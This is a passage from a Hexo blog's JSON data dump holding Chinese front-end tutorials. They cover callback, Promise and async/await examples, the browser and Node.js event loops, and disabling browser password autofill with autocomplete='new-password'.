class=\"string\">'10001'</span>,</span><br><span class=\"line\">                    data: &#123;</span><br><span class=\"line\">                        param2: <span class=\"string\">'abcde'</span></span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;;</span><br><span class=\"line\">                <span class=\"built_in\">console</span>.log(<span class=\"string\">'检查合法请求完成：'</span> + response2);</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (response2.code === <span class=\"string\">'10001'</span>) &#123;</span><br><span class=\"line\">                    <span class=\"built_in\">console</span>.log(<span class=\"string\">'callback'</span>);</span><br><span class=\"line\">                    doExportData(response.data.param1, response2.data.param2);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            &#125;, <span class=\"number\">500</span>)</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;, <span class=\"number\">500</span>)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">exportData();</span><br><span class=\"line\"><span class=\"comment\">// 执行结果</span></span><br><span class=\"line\"><span class=\"comment\">// 检查登录请求完成：[object Object]</span></span><br><span class=\"line\"><span class=\"comment\">// 检查合法请求完成：[object Object]</span></span><br><span class=\"line\"><span class=\"comment\">// callback</span></span><br><span class=\"line\"><span class=\"comment\">// [export data]param:\"12345\"</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"示例二：Promise\"><a href=\"#示例二：Promise\" class=\"headerlink\" title=\"示例二：Promise\"></a>示例二：Promise</h2><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 执行下载数据</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">doExportData</span>(<span class=\"params\">data</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">'[export data]param:'</span> + <span class=\"built_in\">JSON</span>.stringify(data));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> myPromise = <span class=\"keyword\">new</span> <span class=\"built_in\">Promise</span>(<span class=\"function\">(<span class=\"params\">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">// 模拟异步请求返回数据</span></span><br><span class=\"line\">    setTimeout(<span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">let</span> response = &#123;</span><br><span class=\"line\">            code: <span class=\"string\">'10001'</span>,</span><br><span class=\"line\">            data: &#123;</span><br><span class=\"line\">                param1: <span class=\"string\">'12345'</span></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (response.code === <span class=\"string\">'10001'</span>) &#123;</span><br><span class=\"line\">            resolve(response.data.param1);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;, <span class=\"number\">500</span>)</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\">myPromise.then(<span class=\"function\">(<span class=\"params\">param1</span>) =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"built_in\">Promise</span>(<span class=\"function\">(<span class=\"params\">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">// 模拟异步请求返回数据</span></span><br><span class=\"line\">        setTimeout(<span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">let</span> response2 = &#123;</span><br><span class=\"line\">                code: <span class=\"string\">'10001'</span>,</span><br><span class=\"line\">                data: &#123;</span><br><span class=\"line\">                    param2: <span class=\"string\">'abcde'</span></span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (response2.code === <span class=\"string\">'10001'</span>) &#123;</span><br><span class=\"line\">                resolve(&#123; <span class=\"attr\">param1</span>: param1, <span class=\"attr\">param2</span>: response2.data.param2 &#125;);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;, <span class=\"number\">500</span>)</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">&#125;).then(<span class=\"function\">(<span class=\"params\">data</span>) =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">'promise'</span>);</span><br><span class=\"line\">    doExportData(data.param1, data.param2);</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// promise</span></span><br><span class=\"line\"><span class=\"comment\">// [export data]param:\"12345\"</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"示例三：async-await\"><a href=\"#示例三：async-await\" class=\"headerlink\" title=\"示例三：async await\"></a>示例三：async await</h2><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 执行下载数据</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">doExportData</span>(<span class=\"params\">data</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">'[export data]param:'</span> + <span class=\"built_in\">JSON</span>.stringify(data));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">ajax1</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"built_in\">Promise</span>(<span class=\"function\">(<span class=\"params\">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class=\"line\">        setTimeout(<span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">let</span> response = &#123;</span><br><span class=\"line\">                code: <span class=\"string\">'10001'</span>,</span><br><span class=\"line\">                data: &#123;</span><br><span class=\"line\">                    param: <span class=\"string\">'12345'</span></span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;;</span><br><span class=\"line\">            <span class=\"comment\">// let response = &#123;</span></span><br><span class=\"line\">            <span class=\"comment\">//     code: '10002',</span></span><br><span class=\"line\">            <span class=\"comment\">//     data: &#123;</span></span><br><span class=\"line\">            <span class=\"comment\">//         param: 'ajax1 error'</span></span><br><span class=\"line\">            <span class=\"comment\">//     &#125;</span></span><br><span class=\"line\">            <span class=\"comment\">// &#125;;</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (response.code === <span class=\"string\">'10001'</span>) &#123;</span><br><span class=\"line\">                resolve(response.data);</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                reject(response.data);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;, <span class=\"number\">500</span>)</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">ajax2</span>(<span class=\"params\">data1</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"built_in\">Promise</span>(<span class=\"function\">(<span class=\"params\">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class=\"line\">        setTimeout(<span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">let</span> response = &#123;</span><br><span class=\"line\">                code: <span class=\"string\">'10001'</span>,</span><br><span class=\"line\">                data: &#123;</span><br><span class=\"line\">                    param: <span class=\"string\">'abcde'</span></span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;;</span><br><span class=\"line\">            <span class=\"comment\">// let response = &#123;</span></span><br><span class=\"line\">            <span class=\"comment\">//     code: '10002',</span></span><br><span class=\"line\">            <span class=\"comment\">//     data: &#123;</span></span><br><span class=\"line\">            <span class=\"comment\">//         param: 'ajax2 error'</span></span><br><span class=\"line\">            <span class=\"comment\">//     &#125;</span></span><br><span class=\"line\">            <span class=\"comment\">// &#125;;</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (response.code === <span class=\"string\">'10001'</span>) &#123;</span><br><span class=\"line\">                resolve(&#123; <span class=\"attr\">param1</span>: data1.param, <span class=\"attr\">param2</span>: response.data.param &#125;);</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                reject(response.data);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;, <span class=\"number\">500</span>)</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">async</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">exportData</span>(<span class=\"params\">params</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">let</span> data1 = <span class=\"keyword\">await</span> ajax1();</span><br><span class=\"line\">        <span class=\"keyword\">let</span> data = <span class=\"keyword\">await</span> ajax2(data1);</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(<span class=\"string\">'async await'</span>);</span><br><span class=\"line\">        doExportData(data);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">catch</span> (error) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(error);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">exportData();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// async await</span></span><br><span class=\"line\"><span class=\"comment\">// [export data]param:&#123;\"param1\":\"12345\",\"param2\":\"abcde\"&#125;</span></span><br></pre></td></tr></table></figure>\n<p>其实async await只是promise的魔法糖，例如示例三可调整为如下：<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> myPromise = ajax1();</span><br><span class=\"line\">myPromise.then(<span class=\"function\">(<span class=\"params\">data1</span>) =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> ajax2(data1);</span><br><span class=\"line\">&#125;).then(<span class=\"function\">(<span class=\"params\">data</span>) =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">'promise'</span>);</span><br><span class=\"line\">    doExportData(data);</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// promise</span></span><br><span class=\"line\"><span class=\"comment\">// [export data]param:&#123;\"param1\":\"12345\",\"param2\":\"abcde\"&#125;</span></span><br></pre></td></tr></table></figure></p>\n<h1 id=\"后记\"><a href=\"#后记\" class=\"headerlink\" title=\"后记\"></a>后记</h1><p>其实promise也只是对回调函数进行的包装，通过观察者模式实现形式上的同步代码，需要深入研究的请参阅<a href=\"https://www.jianshu.com/p/b4f0425b22a1\" target=\"_blank\" rel=\"noopener\">Promise原理与实现</a>。</p>"},{"title":"JavaScript的事件循环（Event Loop）","date":"2019-03-04T05:31:43.000Z","updated":"2019-03-04T05:31:43.000Z","_content":"# 前言\n对于事件循环，这次将从浏览器端和node端分别讲解。\n# 概述\nJavaScript是一门单线程非阻塞的脚本语言。对于单线程，主要是因为当初这么语言设计的时候也是为了操作DOM，如果多线程就无法保证操作的顺序性。那么既然单线程了，为什么会非阻塞呢？这是因为事件循环的机制，这个机制处理了我们熟悉的浏览器端的异步事件回调。当然node是基于js的，也有自己的事件循环机制。\n<!-- more -->\n# 详述\n## 浏览器端\n浏览器端js是有专门的JS引擎来执行的，在执行JS的主线程中，遇到异步事件，会把回调函数放到执行栈中，直到主线程同步代码执行完，然后开始从执行栈中依次执行添加的回调函数。\n那么这个异步任务有没有优先级呢？\n有。这就是大家常说的宏任务（macro task）与微任务（micro task）。常见的如下：\n宏任务：\n```js\n    setInterval()\n    setTimeout()\n```    \n微任务\n```js\n    new Promise()\n    new MutaionObserver()\n```\n其中微任务优先级高于宏任务，也就是先执行，可以帮上面说的执行栈再细分为微任务执行栈和宏任务执行栈。\n\n## node端\nnode端的事件循环模型官方给出如下示例图：\n![node事件循环](1.jpg)\n\n具体各阶段任务为：\n\ntimers: 这个阶段执行定时器队列中的回调如 setTimeout() 和 setInterval()。\nI/O callbacks: 这个阶段执行几乎所有的回调。但是不包括close事件，定时器和setImmediate()的回调。\nidle, prepare: 这个阶段仅在内部使用，可以不必理会。\npoll: 等待新的I/O事件，node在一些特殊情况下会阻塞在这里。\ncheck: setImmediate()的回调会在这个阶段执行。\nclose callbacks: 例如socket.on('close', ...)这种close事件的回调。\n\n总的循环顺序为：\n首先是添加异步任务回调到poll中\n=>执行完之后到check阶段，主要执行setImmediate()\n=>然后执行close callbacks，主要是socket的close之类的回调\n=>然后到timer阶段，主要是setTimeout() 和 setInterval()回调\n=>I/O callbacks，执行除了模型中列出的阶段回调之外所有的\n=>idle, prepare，内部清理，准备下次循环。\n\n# 后记\n参考：https://www.cnblogs.com/cangqinglang/p/8967268.html","source":"_posts/2019/03/2019-03-04-JavaScript的事件循环（Event-Loop）.md","raw":"---\ntitle: JavaScript的事件循环（Event Loop）\ntags:\n  - JavaScript\ncategories:\n  - 前端\ndate: 2019-03-04 13:31:43\nupdated: 2019-03-04 13:31:43\n---\n# 前言\n对于事件循环，这次将从浏览器端和node端分别讲解。\n# 概述\nJavaScript是一门单线程非阻塞的脚本语言。对于单线程，主要是因为当初这么语言设计的时候也是为了操作DOM，如果多线程就无法保证操作的顺序性。那么既然单线程了，为什么会非阻塞呢？这是因为事件循环的机制，这个机制处理了我们熟悉的浏览器端的异步事件回调。当然node是基于js的，也有自己的事件循环机制。\n<!-- more -->\n# 详述\n## 浏览器端\n浏览器端js是有专门的JS引擎来执行的，在执行JS的主线程中，遇到异步事件，会把回调函数放到执行栈中，直到主线程同步代码执行完，然后开始从执行栈中依次执行添加的回调函数。\n那么这个异步任务有没有优先级呢？\n有。这就是大家常说的宏任务（macro task）与微任务（micro task）。常见的如下：\n宏任务：\n```js\n    setInterval()\n    setTimeout()\n```    \n微任务\n```js\n    new Promise()\n    new MutaionObserver()\n```\n其中微任务优先级高于宏任务，也就是先执行，可以帮上面说的执行栈再细分为微任务执行栈和宏任务执行栈。\n\n## node端\nnode端的事件循环模型官方给出如下示例图：\n![node事件循环](1.jpg)\n\n具体各阶段任务为：\n\ntimers: 这个阶段执行定时器队列中的回调如 setTimeout() 和 setInterval()。\nI/O callbacks: 这个阶段执行几乎所有的回调。但是不包括close事件，定时器和setImmediate()的回调。\nidle, prepare: 这个阶段仅在内部使用，可以不必理会。\npoll: 等待新的I/O事件，node在一些特殊情况下会阻塞在这里。\ncheck: setImmediate()的回调会在这个阶段执行。\nclose callbacks: 例如socket.on('close', ...)这种close事件的回调。\n\n总的循环顺序为：\n首先是添加异步任务回调到poll中\n=>执行完之后到check阶段，主要执行setImmediate()\n=>然后执行close callbacks，主要是socket的close之类的回调\n=>然后到timer阶段，主要是setTimeout() 和 setInterval()回调\n=>I/O callbacks，执行除了模型中列出的阶段回调之外所有的\n=>idle, prepare，内部清理，准备下次循环。\n\n# 后记\n参考：https://www.cnblogs.com/cangqinglang/p/8967268.html","slug":"2019-03-04-JavaScript的事件循环（Event-Loop）","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"ck0m3d8x4004uwovvfszemfaq","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>对于事件循环，这次将从浏览器端和node端分别讲解。</p>\n<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>JavaScript是一门单线程非阻塞的脚本语言。对于单线程，主要是因为当初这么语言设计的时候也是为了操作DOM，如果多线程就无法保证操作的顺序性。那么既然单线程了，为什么会非阻塞呢？这是因为事件循环的机制，这个机制处理了我们熟悉的浏览器端的异步事件回调。当然node是基于js的，也有自己的事件循环机制。<br><a id=\"more\"></a></p>\n<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"浏览器端\"><a href=\"#浏览器端\" class=\"headerlink\" title=\"浏览器端\"></a>浏览器端</h2><p>浏览器端js是有专门的JS引擎来执行的，在执行JS的主线程中，遇到异步事件，会把回调函数放到执行栈中，直到主线程同步代码执行完，然后开始从执行栈中依次执行添加的回调函数。<br>那么这个异步任务有没有优先级呢？<br>有。这就是大家常说的宏任务（macro task）与微任务（micro task）。常见的如下：<br>宏任务：<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">    setInterval()</span><br><span class=\"line\">    setTimeout()</span><br><span class=\"line\"><span class=\"string\">``</span><span class=\"string\">`    </span></span><br><span class=\"line\"><span class=\"string\">微任务</span></span><br><span class=\"line\"><span class=\"string\">`</span><span class=\"string\">``</span>js</span><br><span class=\"line\">    <span class=\"keyword\">new</span> <span class=\"built_in\">Promise</span>()</span><br><span class=\"line\">    <span class=\"keyword\">new</span> MutaionObserver()</span><br></pre></td></tr></table></figure></p>\n<p>其中微任务优先级高于宏任务，也就是先执行，可以帮上面说的执行栈再细分为微任务执行栈和宏任务执行栈。</p>\n<h2 id=\"node端\"><a href=\"#node端\" class=\"headerlink\" title=\"node端\"></a>node端</h2><p>node端的事件循环模型官方给出如下示例图：<br><img src=\"/2019-03-04-JavaScript的事件循环（Event-Loop）/1.jpg\" alt=\"node事件循环\"></p>\n<p>具体各阶段任务为：</p>\n<p>timers: 这个阶段执行定时器队列中的回调如 setTimeout() 和 setInterval()。<br>I/O callbacks: 这个阶段执行几乎所有的回调。但是不包括close事件，定时器和setImmediate()的回调。<br>idle, prepare: 这个阶段仅在内部使用，可以不必理会。<br>poll: 等待新的I/O事件，node在一些特殊情况下会阻塞在这里。<br>check: setImmediate()的回调会在这个阶段执行。<br>close callbacks: 例如socket.on(‘close’, …)这种close事件的回调。</p>\n<p>总的循环顺序为：<br>首先是添加异步任务回调到poll中<br>=&gt;执行完之后到check阶段，主要执行setImmediate()<br>=&gt;然后执行close callbacks，主要是socket的close之类的回调<br>=&gt;然后到timer阶段，主要是setTimeout() 和 setInterval()回调<br>=&gt;I/O callbacks，执行除了模型中列出的阶段回调之外所有的<br>=&gt;idle, prepare，内部清理，准备下次循环。</p>\n<h1 id=\"后记\"><a href=\"#后记\" class=\"headerlink\" title=\"后记\"></a>后记</h1><p>参考：<a href=\"https://www.cnblogs.com/cangqinglang/p/8967268.html\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.com/cangqinglang/p/8967268.html</a></p>\n","site":{"data":{}},"excerpt":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>对于事件循环，这次将从浏览器端和node端分别讲解。</p>\n<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>JavaScript是一门单线程非阻塞的脚本语言。对于单线程，主要是因为当初这么语言设计的时候也是为了操作DOM，如果多线程就无法保证操作的顺序性。那么既然单线程了，为什么会非阻塞呢？这是因为事件循环的机制，这个机制处理了我们熟悉的浏览器端的异步事件回调。当然node是基于js的，也有自己的事件循环机制。<br></p>","more":"<p></p>\n<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"浏览器端\"><a href=\"#浏览器端\" class=\"headerlink\" title=\"浏览器端\"></a>浏览器端</h2><p>浏览器端js是有专门的JS引擎来执行的，在执行JS的主线程中，遇到异步事件，会把回调函数放到执行栈中，直到主线程同步代码执行完，然后开始从执行栈中依次执行添加的回调函数。<br>那么这个异步任务有没有优先级呢？<br>有。这就是大家常说的宏任务（macro task）与微任务（micro task）。常见的如下：<br>宏任务：<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">    setInterval()</span><br><span class=\"line\">    setTimeout()</span><br><span class=\"line\"><span class=\"string\">``</span><span class=\"string\">`    </span></span><br><span class=\"line\"><span class=\"string\">微任务</span></span><br><span class=\"line\"><span class=\"string\">`</span><span class=\"string\">``</span>js</span><br><span class=\"line\">    <span class=\"keyword\">new</span> <span class=\"built_in\">Promise</span>()</span><br><span class=\"line\">    <span class=\"keyword\">new</span> MutaionObserver()</span><br></pre></td></tr></table></figure></p>\n<p>其中微任务优先级高于宏任务，也就是先执行，可以帮上面说的执行栈再细分为微任务执行栈和宏任务执行栈。</p>\n<h2 id=\"node端\"><a href=\"#node端\" class=\"headerlink\" title=\"node端\"></a>node端</h2><p>node端的事件循环模型官方给出如下示例图：<br><img src=\"/2019-03-04-JavaScript的事件循环（Event-Loop）/1.jpg\" alt=\"node事件循环\"></p>\n<p>具体各阶段任务为：</p>\n<p>timers: 这个阶段执行定时器队列中的回调如 setTimeout() 和 setInterval()。<br>I/O callbacks: 这个阶段执行几乎所有的回调。但是不包括close事件，定时器和setImmediate()的回调。<br>idle, prepare: 这个阶段仅在内部使用，可以不必理会。<br>poll: 等待新的I/O事件，node在一些特殊情况下会阻塞在这里。<br>check: setImmediate()的回调会在这个阶段执行。<br>close callbacks: 例如socket.on(‘close’, …)这种close事件的回调。</p>\n<p>总的循环顺序为：<br>首先是添加异步任务回调到poll中<br>=&gt;执行完之后到check阶段，主要执行setImmediate()<br>=&gt;然后执行close callbacks，主要是socket的close之类的回调<br>=&gt;然后到timer阶段，主要是setTimeout() 和 setInterval()回调<br>=&gt;I/O callbacks，执行除了模型中列出的阶段回调之外所有的<br>=&gt;idle, prepare，内部清理，准备下次循环。</p>\n<h1 id=\"后记\"><a href=\"#后记\" class=\"headerlink\" title=\"后记\"></a>后记</h1><p>参考：<a href=\"https://www.cnblogs.com/cangqinglang/p/8967268.html\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.com/cangqinglang/p/8967268.html</a></p>"},{"title":"禁止浏览器自动填充账号密码","date":"2019-03-05T01:49:08.000Z","updated":"2019-03-05T01:49:08.000Z","_content":"# 前言\n对于禁用表单自动填充，HTML5标准语法是在form或者input元素上加`autocomplete=\"off\"`，实践发现有些兼容问题。\n\n# 概述\n一般来讲对于浏览器自动填充表单的账号密码是不需要处理的，但是当登录可以用email+password或者phone+password就得处理了，实践发现用email注册登录后，下次再phone登录页面会自动填充email账号。\n<!-- more -->\n# 详述\nemail登录页自动填充，体验是没有问题的，如图：\n![email+password](1.jpg)\n\n但是切换到phone登录页自动填充，体验就不好了，phone输入框自动填上了email，如图：\n![phone+password](2.jpg)\n\n对于这种情况怎么处理呢，最简单的方式就是禁用自动填充，如图：\n![phone+password](3.jpg)\n\n但是对于chrome浏览器，当你授权记住登录密码的，这种有登录密码的页面，直接加`autocomplete=\"off\"`是无效的，浏览器还是会强行填充账号密码。\n\n怎么处理呢？\n\n在password元素上加`autocomplete=\"new-password\"`就可以了。\n```js\n<input placeholder=\"Password\" type=\"password\" name=\"password\" tabindex=\"2\" autocomplete=\"new-password\">\n```\n\n# 后记\n以上处理方式也只是简单的优化下体验，对于各种浏览器，可能各家对于允许记住密码的自动填充策略各不相同，因此如果觉得只需要体验改善，没必要下大功夫处理的，这样就好了。如果非得处理，也可以再加个隐藏的password元素给自动配对，而显示另一个，或者用js处理等方式。","source":"_posts/2019/03/2019-03-05-禁止浏览器自动填充账号密码.md","raw":"---\ntitle: 禁止浏览器自动填充账号密码\ntags:\n  - HTML\ncategories:\n  - 前端\ndate: 2019-03-05 09:49:08\nupdated: 2019-03-05 09:49:08\n---\n# 前言\n对于禁用表单自动填充，HTML5标准语法是在form或者input元素上加`autocomplete=\"off\"`，实践发现有些兼容问题。\n\n# 概述\n一般来讲对于浏览器自动填充表单的账号密码是不需要处理的，但是当登录可以用email+password或者phone+password就得处理了，实践发现用email注册登录后，下次再phone登录页面会自动填充email账号。\n<!-- more -->\n# 详述\nemail登录页自动填充，体验是没有问题的，如图：\n![email+password](1.jpg)\n\n但是切换到phone登录页自动填充，体验就不好了，phone输入框自动填上了email，如图：\n![phone+password](2.jpg)\n\n对于这种情况怎么处理呢，最简单的方式就是禁用自动填充，如图：\n![phone+password](3.jpg)\n\n但是对于chrome浏览器，当你授权记住登录密码的，这种有登录密码的页面，直接加`autocomplete=\"off\"`是无效的，浏览器还是会强行填充账号密码。\n\n怎么处理呢？\n\n在password元素上加`autocomplete=\"new-password\"`就可以了。\n```js\n<input placeholder=\"Password\" type=\"password\" name=\"password\" tabindex=\"2\" autocomplete=\"new-password\">\n```\n\n# 后记\n以上处理方式也只是简单的优化下体验，对于各种浏览器，可能各家对于允许记住密码的自动填充策略各不相同，因此如果觉得只需要体验改善，没必要下大功夫处理的，这样就好了。如果非得处理，也可以再加个隐藏的password元素给自动配对，而显示另一个，或者用js处理等方式。","slug":"2019-03-05-禁止浏览器自动填充账号密码","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"ck0m3d8x5004xwovvch1wmu1z","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>对于禁用表单自动填充，HTML5标准语法是在form或者input元素上加<code>autocomplete=&quot;off&quot;</code>，实践发现有些兼容问题。</p>\n<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>一般来讲对于浏览器自动填充表单的账号密码是不需要处理的，但是当登录可以用email+password或者phone+password就得处理了，实践发现用email注册登录后，下次再phone登录页面会自动填充email账号。<br><a id=\"more\"></a></p>\n<h1 id=\"详述\"><a href=\"#详述\" 